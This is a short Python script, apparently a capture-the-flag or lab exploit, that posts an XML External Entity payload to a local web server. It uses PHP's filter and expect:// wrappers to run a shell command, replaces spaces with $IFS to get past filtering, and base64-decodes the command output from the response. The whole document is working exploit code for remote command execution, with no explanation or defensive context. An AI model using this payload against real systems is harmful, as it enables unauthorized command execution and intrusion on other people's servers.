#!/usr/bin/env python3

import requests, re, base64

xml = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=expect://CMD">
]>
<root>
    <name></name>
    <email>OUTPUT&xxe;OUTPUT</email>
</root>"""

cmd = "ls -al /"

r = requests.post(
    "http://127.0.0.1:8080",
    data = xml.replace("CMD", cmd.replace(" ", "$IFS"))
)

data = re.findall(r'OUTPUT([a-zA-Z0-9].+?)OUTPUT', str(r.content))

if len(data) >= 1:
    print(base64.b64decode(data[0]).decode('utf-8'))
else:
    print("[!] Error executing" + cmd)